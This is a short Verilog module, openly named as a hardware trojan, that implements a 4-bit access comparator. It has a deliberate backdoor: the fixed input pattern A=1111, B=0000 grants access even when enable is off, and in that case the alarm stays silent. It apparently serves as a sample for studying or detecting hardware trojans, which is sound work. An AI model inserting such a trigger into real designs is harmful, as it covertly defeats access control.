module security_trojan (
    input  [3:0] A,
    input  [3:0] B,
    input        enable,
    output       access_granted,
    output       alarm
);

wire match;
wire trigger;

assign match = (A == B);

assign trigger = (A == 4'b1111) & (B == 4'b0000);

assign access_granted = (enable & match) | trigger;

assign alarm = enable & ~match;

endmodule 